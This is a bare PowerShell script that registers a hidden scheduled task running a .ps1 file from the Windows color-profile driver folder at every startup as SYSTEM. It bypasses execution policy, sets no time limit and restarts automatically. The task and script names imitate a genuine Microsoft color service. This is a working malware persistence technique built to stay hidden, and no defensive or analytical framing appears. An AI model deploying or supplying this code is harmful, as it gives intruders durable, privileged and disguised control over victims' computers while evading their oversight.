$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"C:\Windows\System32\spool\drivers\color\ColorProfile_svc.ps1`""

# Fires at system startup, no user login required
$trigger = New-ScheduledTaskTrigger -AtStartup

# Settings — hidden, runs even on battery, no time limit
$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -ExecutionTimeLimit (New-TimeSpan -Hours 0) `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1)

Register-ScheduledTask `
    -TaskName "Microsoft\Windows\WindowsColorSystem\ColorProfileUpdater" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -RunLevel Highest `
    -User "SYSTEM" `
    -Force